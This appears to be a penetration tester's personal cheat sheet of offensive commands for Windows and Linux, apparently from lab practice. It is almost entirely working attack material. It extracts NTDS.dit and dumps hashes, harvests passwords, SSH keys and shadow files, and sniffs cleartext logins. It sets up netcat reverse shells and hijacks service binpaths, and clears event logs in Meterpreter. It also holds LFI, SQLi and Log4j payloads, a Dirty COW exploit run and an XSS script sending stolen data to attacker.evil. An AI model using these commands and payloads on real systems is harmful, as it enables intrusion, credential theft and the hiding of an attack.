wmic shadowcopy where "ID='{B6063AED-3F9B-4A75-B16E-6B1AFCDAD6CB}'" get DeviceObject
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

#need to delete

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
get C:\Windows\Temp\ntds.dit
python /usr/share/doc/python-impacket/examples/secretsdump.py -ntds ntds.dit -system system LOCAL > secrets.txt

###################################
#### VSSADMIN                ######
###################################
dir C:\Windows\NTDS\ntds.dit
vssadmin create shadow /for=C:
vssadmin list shadows
Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {d1fcd10a-a64b-42f6-877e-632ccb62e6d8}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
get C:\Windows\Temp\ntds.dit
del C:\Windows\Temp\ntds.dit
vssadmin delete shadows /shadow={d1fcd10a-a64b-42f6-877e-632ccb62e6d8} /quiet

python /usr/share/doc/python-impacket/examples/secretsdump.py -ntds ntds.dit -system system LOCAL > secrets.txt

###################################
#### WINDOWS ROUTES           #####
###################################
route print

###################################
#### WINDOWS ARP              #####
###################################
arp -a

###################################
#### WINDOWS HOST FILE        #####
###################################
type C:\WINDOWS\System32\drivers\etc\hosts

###################################
#### SEARCH WINDOWS FOR CREDS #####
###################################
dir C:\unattend.xml
dir C:\sysprep.inf
dir C:\sysprep\sysprep.inf

dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s 
dir registry::
forfiles /P C:\ /S /D +12/07/2013
findstr /C:"searchstring" /S C:\* 2>nul
findstr /C:searchstring /S C:\* 2>nul

###################################
#### WINDOWS ENUM SCRIPT     ######
###################################
JAWS
https://github.com/411Hall/Jaws.git
powershell.exe -ExecutionPolicy Bypass -File .\jaws.ps1 -OutputFilename jenum.txt

https://github.com/pentestmonkey/windows-privesc-check

git clone https://github.com/absolomb/WindowsEnum.git /opt/WindowsEnum
cp /opt/WindowsEnum/WindowsEnum.ps1 .
#upload
#quick standard checks
powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1
#extended checks 
powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended

###################################
#### UNIX PRIV ESC SCRIPTS   ######
###################################
cp /opt/linuxprivcheck/linuxprivchecker.py /var/www/html
wget http://10.11.0.164/linuxprivchecker.py
chmod +x linuxprivchecker.py
python linuxprivchecker.py

cp /opt/LinEnum/LinEnum.sh /var/www/html
wget http://10.11.0.164/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

cp /usr/share/unix-privesc-check/unix-privesc-check /var/www/html
wget http://10.11.0.164/unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard
./unix-privesc-check detailed

cp /opt/linux-exploit-suggester/linux-exploit-suggester.sh /var/www/html
wget http://10.11.0.164/linux-exploit-suggester.sh 
chmod +x linux-exploit-suggester.sh 
./linux-exploit-suggester.sh 
###################################
#### SURVEY LINUX            ######
###################################
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
#distro
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
#kernel version
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
rpm -q kernel --last
dmesg | grep Linux
ls /boot | grep vmlinuz-
#env vars
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
#printers
lpstat -a
#apps & services
ps -aux
ps -ef
top
cat /etc/services
#root services
ps -aux | grep root
ps -ef | grep root
#apps installed, version, are they running?
ls -alh /usr/bin
ls -alh /sbin
dpkg -l
dpkg -l | grep -v lib
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
#misconfigured services?
service --status-all
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
#scheduled jobs?
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
#plaintext passwords/usernames
grep -i password -R /etc 2>/dev/null
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
#nics
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
#net config, what is on the network? dhcp srv? dns srv? gateway?
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
cat /etc/nsswitch.conf
iptables -L
hostname
dnsdomainname
#what other users and hosts are communicating on the system?
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
#what is cached? arp/mac
arp -e
route
/sbin/route -nee
#try to sniff traffic
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
#cleartext creds sniff
tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20

#shell? 
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
#port forwarding?
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
#confidential info and users, who are you, who is logged in, who else is there, who can do what?
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
#sensitive files?
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
#home directories- interesting files?
ls -ahlR /root/
ls -ahlR /home/
#histories- what has been going on? passwords?
ls -al ~/
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
# user information
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
#private-key info?
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
#which configs can be written to?
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone

#find readable ssh keys?
find /home -name .ssh -perm -o=r -perm -o=x -maxdepth 2 -exec find {} -perm -o=r  \; 2>/dev/null

#find readable bash_history
find /home -name .bash_history -perm -o=r -maxdepth 2 2>/dev/null


#what can be found in /var/?
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
#settings/files hidden on website? database infO?
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
# log files? LFI <-
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
#Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
#If commands are limited, you break out of the "jail" shell?
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
#filesystems mounted
mount
df -h
# to find writeable file system use find command below
#unmounted fs's?
cat /etc/fstab
#advanced permissions
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

#where can be written and executed from?
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
#need to run this on each filesytem from df/mount to test writeability 

find / -perm -o x -type d 2>/dev/null     # world-executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders

#any problem files? world-writeable, nobody files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print  find / -perm -o w -type d 2>/dev/null     # world-writeable folders
 # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files

#what dev/tools/langs installed?
find / -name perl*
find / -name python*
find / -name gcc* 2>/dev/null
find / -name cc

#how can files be uploaded
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp


###################################
#### SURVEY WINDOWS          ######
###################################
http://www.fuzzysecurity.com/tutorials/16.html
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
echo %username%
net users
ipconfig /all
route print
arp -A
netstat -ano
netsh firewall show state
netsh firewall show config
netsh firewall set opmode disable
schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY
wmic /?
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

#These files either contain clear-text passwords or in a Base64 encoded format. 
dir c:\sysprep.inf
dir c:\sysprep\sysprep.xml
dir %WINDIR%\Panther\Unattend\Unattended.xml
dir %WINDIR%\Panther\Unattended.xml

# This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

sc qc Spooler
accesschk.exe -ucqv Spooler
accesschk.exe -uwcqv "Authenticated Users" -accepteula * 
accesschk.exe -uwcqv "<your username>" -accepteula * 

accesschk.exe -ucqv SSDPSRV
accesschk.exe -ucqv upnphost
sc qc upnphost
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost

#check registry perms
accesschk.exe -kvw <username> <reg_path>
accesschk.exe -kvw <username> HKLM\SYSTEM\CurrentControlSet\Services\

#look for unquoted services
#Need: 1)a space char in path, 2) no quotes, 3) write perms to intermediate dir
#Windows searchs for each term separated by a space
#https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
icacls <path>
#^check perms

#if user can modify service binary/binpath, but can't start/stop service, will need to reboot
#^^^^^however reboot is loud AF





###################################
#### SNIFFER                  ######
###################################
use sniffer
sniffer_interfaces
sniffer_start <int_num>
sniffer_stop <int_num>
sniffer_stats <int_num>
sniffer_dump <int_num> <file_loc>
sniffer_release <int_num>
download <file_loc>

####################################
##### SHELL TO METERPRETER #########
####################################
use post/multi/manage/shell_to_meterpreter
set session 1
run

####################################
#####  METERPRETER         #########
####################################
# Delete event logs
clearev

# Event log configuration
run event_manager -i 

# List entries 
run event_manager -l Application
run event_manager -l Security
run event_manager -l System

# Clear specific event log
run event_manager -c Application
run event_manager -c Security
run event_manager -c System

####################################
#####  LFI/RFI         #########
####################################
#https://liberty-shell.com/sec/2018/04/04/lfi/
page=/proc/self/environ <-- a great way to inject a backdoor via the User Agent
page=/var/log/<log file path> <-- can poison logs if you know the location
page=/proc/self/cmdline <-- grab the HTTP config
page=/proc/self/fd/<some number> <-- cycle through these to find the log files *neat technique hey*
page=expect://ls <-- allows code execution though its not enabled by default
page=php://input&cmd=ls <-- have to convert the GET request to POST but with it you achieve RCE also use this a lot on windows targets
page=php://filter/convert.base64-encode/resource= <-- a great way to read web pages that is executed
page=zip:// <--abusing this can get you a backdoor uploaded

WINDOWS/system32/drivers/etc/hosts


###################################
#### JOHN THE RIPPER         ######
###################################
john --wordlist=wordlist.txt --rules --stdout > mutated.txt

####################################
##### DIRBUSTER           ##########
####################################
dirbuster
wordlists https://github.com/diasdavid/node-dirbuster/tree/master/lists
/root/PWK/wordlists-dirbuster/directory-list-2.3-medium.txt


####################################
##### DOTDOTPWN           ##########
####################################
./dotdotpwn.pl -o unix -m http -u http://10.11.1.8/internal/index.php -M POST -b -h 10.11.1.8

./dotdotpwn.pl -o unix -m payload -p payload_sample.txt -u http://10.11.1.8/internal/index.php -M POST -b -h 10.11.1.8 -x 80 -k "root:" -f /etc/passwd
vi payload_sample.txt

*if connection hangs
./killcx 10.11.1.8:80 tap0

####################################
#####      MS-SQL            #######
####################################
#untested... but might work?
sqlcmd -S <ip addr> -U <user> -P <password> -Q "SELECT @@VERSION AS 'SQL SERVER VERSION';"


####################################
##### ENUMERATION GUIDE ############
####################################
# port 21
nc <ip> 21
ftp <ip>
ftp@example.com

** check for anonymous access
Username:
anonymous
anon
Password: 
<blank>
any@email.com

** configuration files
ftpusers
ftp.conf
proftpd.conf

# port 22
nc <ip> 22
scanssh
scanssh -p -r -e excludes random(no.)/Network_ID/Subnet_Mask

** configuration files
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
shosts

# port 23
nc <ip>

** configuration files
/etc/inetd.conf
/etc/xinetd.d/nc
/etc/xinetd.d/snc

# port 25 
nc <ip> 25

*chck user exists
VRFY <user>
*chck user valid
EXPN <user>
*spoof test
HELO anything MAIL FROM: spoofed_address RCPT TO:valid_mail_account DATA . QUIT 
*relay test
HELO anything
    Identical to/from - mail from: <nobody@domain> rcpt to: <nobody@domain>
    Unknown domain - mail from: <user@unknown_domain>
    Domain not present - mail from: <user@localhost>
    Domain not supplied - mail from: <user>
    Source address omission - mail from: <> rcpt to: <nobody@recipient_domain>
    Use IP address of target server - mail from: <user@IP_Address> rcpt to: <nobody@recipient_domain>
    Use double quotes - mail from: <user@domain> rcpt to: <"user@recipent-domain">
    User IP address of the target server - mail from: <user@domain> rcpt to: <nobody@recipient_domain@[IP Address]>
    Disparate formatting - mail from: <user@[IP Address]> rcpt to: <@domain:nobody@recipient-domain>
    Disparate formatting2 - mail from: <user@[IP Address]> rcpt to: <recipient_domain!nobody@[IP Address]>

** configuration files
sendmail.cf
submit.cf

# port 53
host [-aCdlnrTwv ] [-c class ] [-N ndots ] [-R number ] [-t type ] [-W wait ] name [server ] -v verbose format -t (query type) Allows a user to specify a record type i.e. A, NS, or PTR. -a Same as Ã¢â‚¬â€œt ANY. -l Zone transfer (if allowed). -f Save to a specified filename.

nslookup [ -option ... ] [ host-to-find | - [ server ]] 

dig [ @server ] [-b address ] [-c class ] [-f filename ] [-k filename ] [-p port# ] [-t type ] [-x addr ] [-y name:key ] [-4 ] [-6 ] [name ] [type ] [class ] [queryopt... ]

whois-h Use the named host to resolve the query -a Use ARIN to resolve the query -r Use RIPE to resolve the query -p Use APNIC to resolve the query -Q Perform a quick lookup

perl /opt/BiLE-suite-master/BiLE.pl [website] [project_name]
perl /opt/BiLE-suite-master/BiLE-weigh.pl [website] [input file]
perl /opt/BiLE-suite-master/vet-IPrange.pl [input file] [true domain file] [output file] <range>
perl /opt/BiLE-suite-master/vet-mx.pl [input file] [true domain file] [output file]
perl /opt/BiLE-suite-master/exp-tld.pl [input file] [output file]
perl /opt/BiLE-suite-master/jarf-dnsbrute [domain_name] (brutelevel) [file_with_names]
perl /opt/BiLE-suite-master/qtrace.pl [ip_address_file] [output_file]
perl /opt/BiLE-suite-master/jarf-rev [subnetblock] [nameserver]

** configuration files
host.conf
resolv.conf
named.conf

# port 69
tftp ip_address PUT local_file
tftp ip_address GET conf.txt (or other files)
#Solarwinds TFTP server
tftp Ã¢â‚¬â€œ i <IP> GET /etc/passwd (old Solaris)
#windows tftp server
tftp 10.11.1.226
GET \WINDOWS\System32\drivers\etc\hosts hosts

#enum windows versions 
#windows 7 (windows 10 contains eula code, can look up version from eula code online)
GET \WINDOWS\System32\license.rtf license.rtf
#windows xp
GET \WINDOWS\System32\eula.txt eula.txt

# port 79

** user enum
finger 'a b c d e f g h' @example.com
finger admin@example.com
finger user@example.com
finger 0@example.com
finger .@example.com
finger **@example.com
finger test@example.com
finger @example.com

**command execution
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"

** finger bounce
finger user@host@victim
finger @internal@external

# port 80, 8080, etc
nc <ip> 80
curl -i -X OPTIONS http://10.11.1.39

whatweb <ip or fqdn>
whatweb -l #list known plugins/webservices

** firefox plugins
	firecat
	add n edit cookies
	asnumber
	headerspy
	live http headers
	shazou
	web developer

** Crawl site
lynx [options] startfile/URL Options include -traversal -crawl -dump -image_links -source
httprint
Metagoofil
metagoofil.py -d [domain] -l [no. of] -f [type] -o results.html

** Web directory enumeration
nikto -h <target> <options>
dirbuster
gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s '200,204,301,302,307,403,500' -e
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc=404 http://<ip>/FUZZ/
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc=404 http://<ip>/FUZZ.php
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -w colors.txt --hc=404 http://<ip>/FUZ2ZFUZZ.php
wikto
goolag scanner

** Vuln Assess
*** Method Testing
nc <ip> 80
HEAD / HTTP/1.0
OPTIONS / HTTP/1.0
PROPFIND / HTTP/1.0
TRACE / HTTP/1.1
PUT http://Target_URL/FILE_NAME
POST http://Target_URL/FILE_NAME HTTP/1.x

** Upload Files
curl -u <username:password> -T file_to_upload <Target_URL>
curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" <Target_URL>
put.pl -h target -r /remote_file_name -f local_file_name
cadaver **webdav

** View Source
Hidden Values
Developer Remarks
Extraneous Code
Passwords!

** Input Validation Checks
*** possible error messages
NULL
null
*** Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
'
"
;  
<!
*** Used to craft SQL Injection queries
-
=
+
"
*** Used to bypass login screens SQLi
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--

*** Used to find command execution vulnerabilities
"><script>alert(1)</script>
*** Carriage Return (%0d) Line Feed (%0a)
%0d
%0a
    HTTP Splitting
        language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
            i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47<html>blah</html>
    Cache Poisoning
        language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>

*** byte-length overflows; maximum 7- and 8-bit values
%7f
%ff
*** Integer and underflow vulnerabilities
-1
other
*** Testing for format string vulnerabilities
%n
%x
%s
*** Directory Traversal Vulnerabilities
../
*** Wildcard characters can sometimes present DoS issues or information disclosure
%
_
* 
*** Overflow vulns
Ax1024+

##############################
#### WORDPRESS SCAN ##########
##############################
wpscan -u http://<fqdn> --enumerate t --enumerate p --enumerate u

##############################
#### SQLMAP            #######
##############################
# search for form
sqlmap -u https://<fqdn>/page.php --form --dbs

# now use known parameters
sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2"

# three forms of injection can be provided by sqlmap
#enumerate databases
sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" --dbs

#enumerate tables in database
sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> --tables

#enumerate columns in database
sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> -T <table_name> --columns

#enumerate data
sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> -T <table_name> --dump

##############################
#### JS / XSS Payloads #######
##############################

#### GET CSRF TOKEN, Exfil Data #####
var xhr1 = new XMLHttpRequest();
xhr1.onload = function(e) {
  var csrfEl = xhr1.response.getElementById("CSRFToken");
  var csrfVal = csrfEl.attributes.getNamedItem("value").value;
  console.log(csrfVal);
  var xhr2 = new XMLHttpRequest();
  xhr2.onload = function(f) {
    var data = xhr2.responseText;
    console.log(data);
    var xhr3 = new XMLHttpRequest();
    xhr3.open("POST", "https://attacker.evil/stolen_data");
    xhr3.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr3.send(data);
  }
  xhr2.open("POST", "https://<target>");
  xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr2.send('CSRFToken='+csrfVal);
}
xhr1.open("GET", "https://<target>");
xhr1.responseType = "document";
xhr1.send();
#######################################
<svg onload=document.write(atob('PHNjcmlwdCBzcmM9aHR0cHM6Ly9hdHRhY2tlci5ldmlsL3N0b2xlbi5qcz48L3NjcmlwdD4='))>
#######################################
// Example POST method implementation:
async function postData(url = '', data = {}) {
  // Default options are marked with *
  const response = await fetch(url, {
    method: 'POST', // *GET, POST, PUT, DELETE, etc.
    mode: 'cors', // no-cors, *cors, same-origin
    cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
    credentials: 'same-origin', // include, *same-origin, omit
    headers: {
      'Content-Type': 'application/json'
      // 'Content-Type': 'application/x-www-form-urlencoded',
    },
    redirect: 'follow', // manual, *follow, error
    referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
    body: JSON.stringify(data) // body data type must match "Content-Type" header
  });
  return response.json(); // parses JSON response into native JavaScript objects
}

postData('https://example.com/answer', { answer: 42 })
  .then(data => {
    console.log(data); // JSON data parsed by `data.json()` call
  });
##############################
#### LOG-4j            #######
##############################
referer: ${jndi:ldap://<hostname>}
x-http-host-override: ${jndi:ldap://<hostname>}
true-client-ip: ${jndi:ldap://<hostname>}
x-forwarded-port: 443
x-client-ip: ${jndi:ldap://<hostname>}
cf-connecting_ip: ${jndi:ldap://<hostname>}
x-forwarded-host: ${jndi:ldap://<hostname>}
contact: ${jndi:ldap://<hostname>}
from: ${jndi:ldap://<hostname>}
cache-control: no-transform
x-forwarded-proto: https
accept-language: en
client-ip: ${jndi:ldap://<hostname>}
x-forwarded-for: ${jndi:ldap://<hostname>}
x-originating-ip: ${jndi:ldap://<hostname>}
x-host: ${jndi:ldap://<hostname>}
forwarded: ${jndi:ldap://<hostname>}
accept: */*
x-real-ip: ${jndi:ldap://<hostname>}

##############################
#### DIRTY COW         #######
##############################
#Check RHEL
wget https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
chmod +x rh-cve-2016-5195_5.sh
./rh-cve-2016-5195_5.sh

/usr/share/exploitdb/exploits/linux/local/40839.c
gcc -pthread 40839.c -o dirty -lcrypt
./dirty firefart4

#############################
#####  SOCAT      ###########
#############################
#connect a binary to a socket
socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./executable

#############################
##### EC2 ENUM Meterpreter ##
#############################
spool /tmp/ec2out.txt
sessions -C "upload win64_ec2_enum.exe"
sessions -C "execute -f C:\\\\Windows\\\\System32\\\\win64_ec2_enum.exe -i"
spool off

#############################
#####   OBJDUMP      ########
#############################
objdump -R <binary>


#############################
#####     GDB         #######
#############################
#breakpoint offset from fxn
break *(main+658)
#breakpoint at fxn
b modbus_reply
#breakpoint at mem addr
b *0xb7fbc864

#next line
n
#next instr
ni
#step into line
s
#step into instr
si

#print
p <item to print>
#print ptr
p &rsp
#print struct
p *mb_mapping

x/10rw 0xbffff68c
x/1000wr rsp
x/100rw 0xbffff68c
x/4x 0xbffff69c

#read instructions
x/i <addr>

info symbol 0x8040f30

info frame
info variables
info locals
info args
info registers

set *0xbffff69c = 0x8048f30

#rop
print &system
find &system,+9999999,"/bin/sh"
search '/bin/sh/'

cyclic <number o bytes>
cyclic -l <bytes in eip>

#if program waiting for input, Ctrl+c and you can go back to gdb

disassemble <fxn>

#inside of pwntools/gdb
shell

#rop with aslr
#look for libc
#calculate libc address

vmmap 
#get libc baseaddr (the only executable libc or the lowest addr?)

p <known libc addr> - <libc base addr>

#or...
p/x system - <known libcaddr>

#python pwn tools
#normally see big endian
p32
#pack 32 bit
p64
#pack 64 bit

#ghidra
#symbol tree -> what functions are there -> you can call

ropper --file <filename> --search "pop r

#32bit - always on stack
#64bit - sometimes paramter in register
